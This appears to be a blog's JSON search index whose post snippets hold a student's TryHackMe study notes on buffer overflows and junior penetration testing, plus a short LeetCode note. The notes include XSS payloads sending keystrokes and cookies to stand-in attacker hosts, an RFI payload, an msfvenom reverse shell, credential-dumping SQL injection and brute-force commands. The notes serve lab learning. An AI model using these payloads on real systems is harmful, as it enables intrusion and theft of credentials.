[
  
  {
    "title": "Two Sum",
    "url": "/posts/Two-Sum/",
    "categories": "dev",
    "tags": "leetcode, java, python",
    "date": "2022-03-27 11:33:00 +0800",
    





    "snippet": "LinkJAVA HashMap    Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();    map.containskey(), map.get(),Python HashMap  https://docs.python.org/3/tutorial/datastructures.html#dictionaries"
  },
  
  {
    "title": "Buffer over flow",
    "url": "/posts/BOF/",
    "categories": "sec",
    "tags": "bof, assembly, thm",
    "date": "2022-03-27 11:33:00 +0800",
    





    "snippet": "Learn from Videounderstand stack MOST IMPORTANT !!!What happens when you call a procedure?  https://www.youtube.com/watch?v=RU5vUIl1vRsAssembly Programming Assembly Function Stack Frame Explained  https://www.youtube.com/watch?v=vcfQVwtoyHY{low}ESP points to the top of the stack, at lower memory location.{buffer}EBP points to higher memory address, at the bottom of the stack, EIP holds the address of next instruction to be executed.{high}(one function on stack)lower addressat ESP value (Extended Stack Pointer)this Buffer Spaceat EBP value (Extended Base Pointer)at EIP value (Extended Instruction Pointer) / Return Addressshellcode start pointhigher addressThe process:  ESP hit command to get input, and the input change the stack value. EBP right, know next is EIP, EIP right. Value in stack wrong.  when ESP hit where EBP saves(on stack), the EBP value will change(or not). EBP wrong, EIP right.  when ESP hit where EIP saves(on stack), the EIP value will change.(to an address with value ‚ÄúJMP ESP‚Äù)  then ESP value increase. (so its meaningfull when we jump back, to the payloads.)  EIP do JMP ESP (JMP back to where the ESP is now pointing.)  EIP do the payload commands line by line.(one program in memory)(EIP start from TEXT, when meet a function, point to STACK return address))lower addressTEXTDATAHEAPSTACKhigher addressRET instruction:  This will take a dword from the top of the stack at esp and load it to eip,  while also adding 4 to esp‚Äôs value (to move it up to the next entry)Another way(not JMP ESP):  PUSH ESP, RET  https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret/Cyber Mentor BOF video and his recommendation  https://www.youtube.com/watch?v=ncBblM920jw  https://github.com/johnjhacking/Buffer-Overflow-Guide  https://tcm-sec.com/buffer-overflows-made-easy/Practice by vulnserver and Immunity Debuggervulnserver  https://thegreycorner.com/vulnserver.htmlif Windows block the download, turn off Windows Defender.Immunity Debugger  https://www.immunityinc.com/products/debugger/Cyber Mentor BOF process:  Spiking  Fuzzing  Finding the Offset  Overwriting the EIP  Finding Bad Characters  Finding the Right Module  Generating Shellcode  Rootnc -nv 192.168.1.90 9999connect to vuln servercommand, STATS [stat_value]1. Spikinggeneric_send_tcpapt-get install spike  ./generic_send_tcp host port spike_script SKIPVAR SKIPSTR  ./generic_send_tcp 192.168.1.100 701 something.spk 0 02. FuzzingSend different characters try to break the program to find the offset/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F43373. Finding the Offsetfind EIP at 20034. Overwriting the EIP  EIP is 4 bytes. (32-bits)  Shellcode = ‚ÄúA‚Äù * 2003 + ‚ÄúB‚Äù * 4  check if B start at EIP.  HEX 41: A.   HEX 42: B.  EIP = ‚Äú42424242‚Äù will be successful.5. Finding Bad Characters  google: ‚Äúbadchars‚Äù  !mona bytearray -cpb ‚Äú\\x00‚Äù6. Finding the Right ModuleFind DLL without memory protection.  search mona.py, save to /Immunity Debugger/ PyCommands.Get JMP ESP shell code# locate nasm_shell# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb‚îÄ‚îÄ(rootüíÄkali)-[/home/kali]‚îî‚îÄ# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rbCalling `DidYouMean::SPELL_CHECKERS.merge!(error_name =&gt; spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.nasm &gt; JMP ESP00000000  FFE4              jmp espin mona, search JMP ESP location!mona modules!mona find -s \\xff\\xe4\" -m essfunc.dllanotherway: !mona jmp -r ESP -m ‚Äúessfunc.dll‚Äùthis module has no memory protections7. Generating Shellcodemsfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={Port} EXITFUNC=thread -f c -a x86 -b ‚Äú\\00‚Äùin python3:put ‚Äòb‚Äô before shell code, means byte encode.THM Brain storm boxnmap -T4 -p- -Pn 10.10.131.179get: 21, 3389, 9999~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ftp 10.10.131.179name: anonymousftp&gt; lschatserver.exeessfun.dllftp&gt; prompt OFFftp&gt; binaryfor safe transfer, byte may crashftp&gt; mget *ftp&gt; bye~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~in Windowsdefender offfirewall off\\r = CR (Carriage Return) ‚Üí Used as a new line character in Mac OS before X\\n = LF (Line Feed) ‚Üí Used as a new line character in Unix/Mac OS X\\r\\n = CR + LF ‚Üí Used as a new line character in Windows"
  },
  
  {
    "title": "Jr Penetrarion Test",
    "url": "/posts/Jr-Penetration-Tester/",
    "categories": "sec",
    "tags": "recon, idor, file-inclusion, ssrf, xss, injection, burpsuite, nmap, protocal, metasploit, msfvenom, meterpreter, reverse-shell, privesc",
    "date": "2022-01-28 00:00:00 +0800",
    





    "snippet": "Content Discovery  Wappalyzer (https://www.wappalyzer.com/)  The Wayback Machine (https://archive.org/web/)  Automated Discovery https://github.com/danielmiessler/SecLists  ffuf,  ‚ÄúFuzz Faster you Fool‚Äù  user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ  dirb  user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  gobuster  user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txtSubdomain Enumeration  Certificate Transparency (CT) logs          SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)        google search -site:www.tryhackme.com  site:*.tryhackme.com  dnsrecon -t brt -d acmeitsupport.thm  ./sublist3r.py -d acmeitsupport.thm  private DNS server. ‚Äú/etc/hosts‚Äù file (or c:\\windows\\system32\\drivers\\etc\\hosts file for Windows users)  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.acmeitsupport.thm\" -u http://10.10.123.130  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.acmeitsupport.thm\" -u http://10.10.123.130 -fs {size} -fs switch, which tells ffuf to ignore any results that are of the specified size.Authentication Bypassfuzz posibble exist usernames.  https://github.com/ffuf/ffuf  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d \"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.94.177/customers/signup -mr \"username already exists\"  -X argument specifies the request method.  -d argument specifies the data that we are going to send.  -H argument is used for adding additional headers to the request. setting the ‚ÄúContent-Type‚Äù to the webserver knows we are sending form data.  -u argument specifies the URL we are making the request to.  -mr argument is the text on the page we are looking for to validate we‚Äôve found a valid username.brute force  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d \"username=W1&amp;password=W2\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.2.151/customers/login -fc 200  -fc argument to check for an HTTP status code other than 200.logic flaw  curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email={username}@customer.acmeitsupport.thm'  the server send email to the address client postscookie tempering  curl -H \"Cookie: logged_in=true; admin=true\" http://10.10.2.151/cookie-test  Hash crack website. https://crackstation.net/IDOR  Insecure Direct Object Referencefind IDOR in Encode IDs  https://www.base64decode.org/; https://www.base64encode.org/find IDOR in Hashed IDs  https://crackstation.net/File Inclusioncommon OS files:  /etc/issue, /etc/profile, /proc/version, /etc/passwd,  /etc/shadow, /root/.bash_history, /var/log/dmessage,  /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log  C:\\boot.iniPhp include function:  https://www.php.net/manual/en/function.include.phpfile-get-contents.php:  https://www.php.net/manual/en/function.file-get-contents.php  user‚Äôs input is passed to a function such as file_get_contents in PHP.  It‚Äôs important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.    file_get_contents( string $filename, bool $use_include_path = false, resource $context = ?, int $offset = 0, int $length = ?): string|false      Local File Inclusion (LFI)&lt;?PHP \tinclude(\"languages/\". $_GET['lang']); ?&gt;Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add ‚Äú.php‚Äù.  Conquer: include(\"languages/../../../../../etc/passwd%00\").\".php\"); %00 or 0x00  NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.Remote File Inclusion - RFI  One requirement for RFI is that the allow_url_fopen option needs to be on.  allow_url_include  https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen  lead server to execute code from attacker`s server.  start attack server: sudo python3 -m http.server  prepare payload: cmd.txt: &lt;?php print exec('hostname');?&gt;  lead victim server to execute it: http://webapp.htm/get.php?file=http://attacker.thm/cmd.txtSSRF  server side request forgery  2 types: regular, blind.    requestbin.comXSS  cross-site scripting  Key Logger js: document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}  Session Stealing js: fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));DOM Based XSS  DOM: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html  window.location.hash parameter.  js: eval() function is very vulnerable.Blind Xss  https://xsshunter.com/  /images/cat.jpg\" onload=\"alert('HTM'); When upload an image, but server filter ‚Äò&lt;‚Äô and ‚Äò&gt;‚Äô, we can use onload function.Polyglots:  Can help you bypass all filters.  jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e  https://blog.ostorlab.co/polyglot-xss.htmlGet cookie from xss:  net cat: nc -nlvp 9001 start server.  fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) );  wait for the victim.Command Injection  also often known as ‚ÄúRemote Code Execution‚Äù (RCE)  https://owasp.org/www-project-top-ten/  https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report  php vulnerable functions: Exec, Passthru, System  php: filter_input https://www.php.net/manual/en/function.filter-input.php  use hexadecimal value to bypass the filter.  cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-listSQL Injection  Structured Query Language  select * from users where username like 'a%'; returns any rows with username beginning with the letter a.  select * from users where username like '%n';  ending with the letter n.  select * from users where username like '%mi%'; characters mi within them.Union  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;Insert  insert into users (username,password) values ('bob','password123');Update  update users SET username='root',password='pass123' where username='admin';Delete  delete from users where username='martin';In-Band SQL Injection  select * from article where id = 0 UNION SELECT 1,2,database()  get database name  select * from article where id = 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'  get table names in the database ‚Äúsqli_one‚Äù  select * from article where id = 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'  get column names in the table ‚Äústaff_users‚Äù  select * from article where id = 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_usersBlind SQLi (Boolean Based)  select * from users where username = ‚ÄòA' UNION SELECT 1,2,3 WHERE database() like 's%';--‚Äô LIMIT 1  we can try every possible combination to find the database`s name.Blind SQLi (Time base)The table has 2 columns.  admin123' UNION SELECT SLEEP(5);-- No sleep, just return.  admin123' UNION SELECT SLEEP(5),2;-- Sleep for 5 sconds.Out-of-Band SQLi:  attack channel could be a web request  data gathering channel could be monitoring HTTP/DNS requests made to a service you control.RemediationÔºö  Prepared Statements (With Parameterized Queries)  Input Validation  Escaping User InputBurp Suite BasicExtensions  java, jython, jRuby  https://www.jython.org/  https://www.jruby.org/  Burp Suite Extender module: load extension, providing a marketplace.Proxy  https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/  Intercept server response. Or Request Was Interceptedembeded browser  Project options -&gt; Misc -&gt; Embedded Browser and check the Allow the embedded browser to run without a sandbox  create a new user and run Burp Suite under a low privilege account.(security, recomanded)scope  after set scope, we need: Proxy Options sub-tab and select And URL Is in target scopePost modified request  URL encode: ctrl+UPOST /ticket/ HTTP/1.1Host: 10.10.117.83User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 37Origin: http://10.10.117.83Connection: closeReferer: http://10.10.117.83/ticket/Upgrade-Insecure-Requests: 1email=alert(\"Succ3ssful%2bXSS\")&amp;content=hack+test  ‚Äú%2b‚Äù -&gt; ‚Äú+‚ÄùBrup Suite: Repeater  Another way: by hand, curl, https://curl.se/  0x0d -Ôºç‚Äù/r‚Äù  0x0a -Ôºç‚Äù/n‚Äù  each line of response ends with ‚Äú/r/n‚Äù, same as ‚Äú0d0a‚Äù.SQLi with repeater  query http://10.10.39.188/about/2' with a ' behind.  Invalid statement: SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'&lt;/code&gt;  The INFORMATION_SCHEMA Database: ‚ÄúThis is the database about databases. It‚Äôs used to store details of other databases on the server‚Äù.  /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name=\"people\"  this requey can only retrieve one column_nmae of the people table.  MySQL GROUP_CONCAT() function returns a string with concatenated non-NULL value from a group.  Notice that we also changed the ID that we are selecting from 2 to 0. By setting the ID to an invalid number, we  ensure that we don‚Äôt retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.  /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name=\"people\"  retrieve all columns name of people table.burpsuite intruder  Intruder is Burp Suite‚Äôs in-built fuzzing tool.  similar to Wfuzz or Ffuf.4 attacks:  sniper attack: pos1, pos2, 3 word a b c. Try: pos1,a; pos1,b; pos1,c;   a,pos2; b,pos2; c,pos2. One wordlist set.  Battering ram attack: puts the same payload in every position rather than in each position in turn. One wordlist set.  Pitchfork attack: uses one payload set per position. iterates through them all at once. Word lists should be identical length.  Cluster bomb attack: iterates through each payload set individually, making sure that every possible combination is tested.CSRF Token bypass:  a session cookie set in the response, as well as a CSRF (Cross-Site Request Forgery) token included in the form as a hidden field. If we refresh the page, we should see that both of these change with each request: this means that we will need to extract valid values for both every time we make a request.  Run macro to ‚ÄúGet‚Äù the session every time before intruder.  update current request with parameters matched from final macro response. (this case, the ‚Äúsession‚Äù parameter.)  Update current request with cookies from session handling cookie jar.  ref: https://portswigger.net/burp/documentation/desktop/options/sessions  csrf token: https://portswigger.net/web-security/csrf/tokensBurp Suite: Other ModulesDecoder  https://gchq.github.io/CyberChef/Sequencer  the effective entropy.Burp Suite: Extender  Burp Suite ‚ÄúBApp‚Äù store.  all traffic passing through Burp Suite will be passed through each extension in order, starting at the top of the list and working down.  https://github.com/portswigger/request-timer    Jython. https://www.jython.org/download. significantly increases the number of extensions available to us.  Jruby. https://www.jruby.org/download.Write extender:  https://portswigger.net/burp/extender/writing-your-first-burp-suite-extensionPassive ReconnaissanceThe Unified Kill Chain  https://www.unifiedkillchain.com/whois  https://www.ietf.org/rfc/rfc3912.txtNmap Live Host Discoverynslookup and dig  nslookup tryhackme.com  nslookup -type=A tryhackme.com 1.1.1.1 find ipv4 in 1.1.1.1  dig tryhackme.com MX  dig @1.1.1.1 tryhackme.com MX  dig thmlabs.com txtDNS records can find more information, like subdomain, especially which not updated regularly.dnsdumpster  https://dnsdumpster.com/Shodan.io  https://help.shodan.io/the-basics/search-query-fundamentals  https://tryhackme.com/room/shodanActive Reconnaissanceweb browser  FoxyProxy(add-one):https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/  User-Agent Switcher and Manager: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/  Wappalyzer https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/  ctrl+shift+I: sources -&gt; script.jspingcount (2 are same)  ping -n 10 10.10.117.50 on MS Windows system.  ping -c 10 10.10.117.50 on Linux or Mac OS.Traceroute  when TTL reaches 0, an ICMP Time-to-Live exceeded would be sent to the original sender.  On linux, traceroute is send in UDP datagrams.Telnet  use Telnet to connect to any service and grab its banner.(not it designed for.)  telnet 10.10.117.50 80 then GET / HTTP/1.1  get the service information.NetcatGET  Netcat supports both TCP and UDP protocols.  nc 10.10.108.61 PORT hostname:abc then, SHIFT+ENTEROpen port and listen  nc -vnlp 1234  -l\tListen mode  -p\tSpecify the Port number  -n\tNumeric only; no resolution of hostnames via DNS  -v\tVerbose output (optional, yet useful to discover any bugs)  -vv\tVery Verbose (optional)  -k\tKeep listening after client disconnectsNmapuse list  nmap -iL list_of_hosts.txt -iL: input filename.ARP  nmap -PR -sn 192.168.0.1/24 -PR: indicates that you only want an ARP scan. -sn: No port scan.ICMP  nmap -PE -sn 192.168.0.1/24 -PE: ICMP.  Nmap didn‚Äôt need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.  if in same subnet, we can see the MAC address.TCP SYN  sudo nmap -PS -sn 192.168.1.1/24 -PS:  TCP SYN ping.  Normal syn ping do not need root user.  Privileged users (root and sudoers) can send TCP SYN packets and don‚Äôt need to complete the TCP 3-way handshake even if the port is open. Will send RST instead. Can avoid some firewall rules.  -PS21 target on port 21.  -PS21-25 21 to 25.TCP ACK  sudo nmap -PA -sn MACHINE_IP/24  need root.UDP  sudo nmap -PU -sn 10.10.68.220/24Reverse-DNS Lookup  Nmap‚Äôs default behaviour is to use reverse-DNS online hosts.  -n to skip this step.  -R to query the DNS server even for offline hostsNmap Basic Port ScansPort States:  Open  Closed  Filtered  Unfiltered                              Open          Filtered                                                  Closed          Filtered                    TCP header  https://datatracker.ietf.org/doc/html/rfc793.html    URG flag: set is processed immediately without consideration of having to wait on previously sent TCP segments.  Push flagÔºö asking TCP to pass the data to the application promptly.TCP Scan  TCP connect scan. nmap -sT {target}  full 3-way handshake, then RST. Only possible TCP port scan if not root.  TCP SYN scan. nmap -sS {target} need root.UDP Scan  nmap -sU {target} Open: no response. Closed: ICMP destination unreachable.Scope and performance  -F most common 100 ports  -T0 scans one port at a time and waits 5 minutes  -T5 is the most aggressive in terms of speed  -T4 is often used during CTFs  --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.  --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel  -p- all ports.Nmap Advanced Port ScansNull Scan  sudo nmap -sN 10.10.22.67, all six flag bits are set to zero.                              closed: RST,ACK. open          filtered: no reply.                      need root.FIN Scan  sudo nmap -sF 10.10.22.67, FIN flag set.                              closed: RST,ACK. open          filtered: no reply.                    Xmas Scan  sudo nmap -sX 10.10.22.67, FIN, PSH, and URG flags set.                              closed: RST,ACK. open          filtered: no reply.                    Why:  A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt.  Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it.  However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.TCP Maimon Scan:  sudo nmap -sM 10.10.22.67, FIN and ACK bits are set.  no much use, open and close reply almost same.TCP ACK Scan:  sudo nmap -sA 10.10.22.67, ACK flag set.  can not find if port is open.  this type of scan is more suitable to discover firewall rule sets and configuration.  Result indicates that the firewall is blocking all other ports except for these three ports.Window Scan:  sudo nmap -sW 10.10.22.67, like ACK scan, with more examines the TCP Window field of the RST packets returned.  TCP window scan pointed that three ports are detected as closed.  Although we know that these three ports are closed, we realize they responded differently, indicating that the firewall does not block them.  ACK and window scans are exposing the firewall rules, not the services.Custom Scan:  sudo nmap --scanflags RSTSYNFIN {target}Spoofing and Decoys  nmap -S {SPOOFED_IP} 10.10.121.57  --spoof-mac SPOOFED_MAC This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).  nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.121.57 decoy, hide among other IPs. RND, random IP.Fragmented Packets  A traditional firewall inspects, at least, the IP header and the transport layer header.  A more sophisticated firewall would also try to examine the data carried by the transport layer.  sudo nmap -sS -p80 -f 10.20.30.144 8 bytes after IP header, in each packet.  sudo nmap -sS -p80 -ff 10.20.30.144 16 bytes after IP header, in each packet.  Nmap splits the packets into eight bytes or less after the IP header. So a 20-byte TCP header would be split into three packets.  The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect.Idle/Zombie Scan  nmap -sI ZOMBIE_IP 10.10.121.57  This is accomplished by checking the IP identification (IP ID) value in the IP header.More Details  sudo nmap -sS --reason 10.10.252.27 get .  -v for verbose output or -vv for even more verbosity.  -d for debugging details or -dd for even more details.Nmap Post Port ScansOS Detection and Traceroute  sudo nmap -sV 10.10.129.53 Version detection.  sudo nmap -sS -O 10.10.129.53 OS detection.  nmap -sS --traceroute 10.10.129.53 traceroute, Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap‚Äôs traceroute starts with a packet of high TTL and keeps decreasing it.Nmap Scripting Engine (NSE)  Lua language.  path: /usr/share/nmap/scripts  -sC Default scriptsScript Category\tDescription  auth\tAuthentication related scripts  broadcast\tDiscover hosts by sending broadcast messages  brute\tPerforms brute-force password auditing against logins  default\tDefault scripts, same as -sC  discovery\tRetrieve accessible information, such as database tables and DNS names  dos\tDetects servers vulnerable to Denial of Service (DoS)  exploit\tAttempts to exploit various vulnerable services  external\tChecks using a third-party service, such as Geoplugin and Virustotal  fuzzer\tLaunch fuzzing attacks  intrusive\tIntrusive scripts such as brute-force attacks and exploitation  malware\tScans for backdoors  safe\tSafe scripts that won‚Äôt crash the target  version\tRetrieve service versions  vuln\tChecks for vulnerabilities or exploit vulnerable serviceshttp-date  sudo nmap -sS -n --script \"http-date\" 10.10.16.134find a certain script  /usr/share/nmap/scripts# find -name '*cve2015-1635*'  with ‚Äòcve2015-1635‚Äô in the middle of the file name.Saving the OutputNormal  -oN FILENAME, N stands for normalGrepable  -oG FILENAMEXML  -oX FILENAMEProtocols and Servershttp  telnet 10.10.115.51 80  GET /index.html HTTP/1.1  host: telnet  double ‚ÄòEnter‚ÄôftpUse telnet  File Transfer Protocol, cleartext  telnet 10.10.115.51 21  USER frank  PASS D2xc9CgD  STAT can provide some added information  SYST command shows the System Type of the target (UNIX in this case)  PASV switches the mode to passive. Active: port 20. Passive: ports above 1023.  TYPE A switches the file transfer mode to ASCII.  TYPE I switches the file transfer mode to binary.  we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.use ftp  ftp 10.10.115.51  ftp&gt; ls  ftp&gt; ascii  ftp&gt; get README.txt  ftp&gt; exit  ftp software: vsftpd, ProFTPD, uFTP. Some web browsers also support FTP protocol.SMTP4 components:  Mail Submission Agent (MSA)  Mail Transfer Agent (MTA):  (SMTP)  Mail Delivery Agent (MDA):  (POP3) or (IMAP)  Mail User Agent (MUA)SMTP  is used to communicate with an MTA server.  default port 25.  telnet MACHINE_IP 25POP3  your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages.  download the email messages from a Mail Delivery Agent (MDA) server  default port 110  telnet 10.10.124.6 110  USER frank  PASS D2xc9CgD  STATIMAP  Internet Message Access Protocol (IMAP)  default port 143  possible to keep your email synchronized across multiple devices (and mail clients), POP3 can not.  changes will be saved on the IMAP server (MDA)  telnet 10.10.124.6 143  LOGIN frank D2xc9CgDProtocols and Servers 2VS:  Confidentiality, Integrity,   Availability (CIA)  Disclosure,      Alternation, Destruction (DAD)Sniffing Attack  Tcpdump, Wireshark, Tshark  sudo tcpdump port 110 -A checking email messages using POP3, in ASCII format.  mitigationÔºö Transport Layer Security (TLS) has been added to HTTP, FTP, SMTP, POP3, IMAP and many others.Man-in-the-Middle (MITM) Attack  Ettercap. https://www.ettercap-project.org/  Bettercap. https://www.bettercap.org/  With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.SSL, TSL are on presentation layer.  https://datatracker.ietf.org/doc/html/rfc6101ports:  HTTP\t80\tHTTPS\t443  FTP\t21\tFTPS\t990. secured using SSL/TLS  FTP   21\tSFTP\t22. secured using the SSH protocol, same port.  SMTP\t25\tSMTPS\t465  POP3\t110\tPOP3S\t995  IMAP\t143\tIMAPS\t993  DNS   DoT(DNS over TLS )  TELNET 23  SSH 22process:  Establish a TCP connection  Establish SSL/TLS connection  Send HTTP requests to the webserverSSH:  port 22.  ssh username@10.10.202.115SCP:  can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol  scp mark@10.10.202.115:/home/mark/archive.tar.gz ~ remote to local  scp backup.tar.bz2 mark@10.10.202.115:/home/mark/ local to remotePassword Attack  Hydra. https://github.com/vanhauser-thc/thc-hydra  hydra -l username -P wordlist.txt server service  server: the hostname or IP address of the target server.  service: the service which you are trying to launch the dictionary attack.  -s PORT Use in case of non-default service port number  -d Display debugging output if the verbose output is not helping  -V or -vV Show the username and password combinations being triedVulnerabilities 101types  Operating System  (Mis)Configuration-based  Weak or Default Credentials  Application Logic  Human-FactorScoring VulnerabilitiesCVSS  https://www.kennasecurity.com/resources/prioritization-to-prediction-report/  CVSS, https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator  open source, VPR not.  start in 2005.VPR  Vulnerability Priority Rating.  takes into account the relevancy of a vulnerability, while CVSS does not.Vulnerability DatabasesNVD  NVD (National Vulnerability Database) https://nvd.nist.gov/vuln/full-listing  ‚ÄúCommon Vulnerabilities and Exposures‚Äù (Or CVE for short)  wanna cry: CVE-2017-0144Exploit-DB  https://www.exploit-db.com/Exploit VulnerabilitiesAutomated Vs. Manual Vulnerability Research  nessus. https://www.tenable.com/products/nessusVulnerability types:  Security Misconfigurations  Broken Access Control  Insecure Deserialization  InjectionFinding Manual Exploits  Rapid7, https://www.rapid7.com/db/  GitHub, search GitHub by keywords such as ‚ÄúPoC‚Äù, ‚Äúvulnerability‚Äù  Searchsploit, offline copy of Exploit-DB  searchsploit online book store search the service ‚Äúonline book store‚Äù  searchsploit -m php/webapps/47887.py copy the exploit  python 47887.py http://10.10.18.54 run the exploitMetasploit: Introductionmain components  msfconsole: The main command-line interface.  Modules: supporting modules such as exploits, scanners, payloads, etc.  Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.components  /opt/metasploit-framework-5101/modules/  Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.  Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.  Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.  Exploits: Exploits, neatly organized by target system.  NOPs: NOPs (No OPeration) do nothing, literally.  Payloads: Payloads are codes that will run on the target system. singles; stagers -&gt; stages.  ‚Äúgeneric/shell_reverse_tcp‚Äù, inline (or single) payload  ‚Äúwindows/x64/shell/reverse_tcp‚Äù, staged payload  Post: useful on the final stage of the penetration testing process listed above, post-exploitation.msfconsole  msf6 &gt; help set  msf6 &gt; history  msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads  payloads that can be used with the ms17-010 Eternalblue exploit.  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; info display detailed information  msf6 &gt; search ms17-010 searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.  use 0 use the listed number.  msf6 &gt; search type:auxiliary telnet search results to only include auxiliary module.  msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; unset allMetasploit: ExploitationTCP scan  msf6 &gt; search portscan  msf6 auxiliary(scanner/portscan/tcp) &gt; show optionsUDP  msf6 auxiliary(scanner/discovery/udp_sweep) &gt; runSMB Scans  msf6 auxiliary(scanner/smb/smb_version) &gt; runMetasploit Database  systemctl start postgresql  msfdb init  msf6 &gt; db_status  msf6 &gt; workspace  msf6 &gt; workspace -a tryhackme add; -d delete  workspace -hdb_nmap  msf6 &gt; db_nmap -sV -p- 10.10.12.229 run nmap, result saved to the database.  msf6 &gt; hosts, msf6 &gt; services show saved information.  hosts -h, services -husage  use auxiliary/scanner/smb/smb_ms17_010  hosts -R add hosts value to the RHOSTS parameter  msf6 &gt; services -S netbios search ‚Äúnetbios‚Äù in serviceslow-hanging fruits  HTTP, FTP, SMB, SSH, RDPExploitation  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads list other commands you can use with that specific exploit.  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2  background it using CTRL+Z or abort it using CTRL+C  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions show sessions, include background.Working with sessions  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -h help  msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1 interact with session 1.example  nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]Msfvenom  Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).  # msfvenom -l payloads  # msfvenom --list formatsencode  # msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} -f raw -e php/base64 The PHP version of Meterpreter was 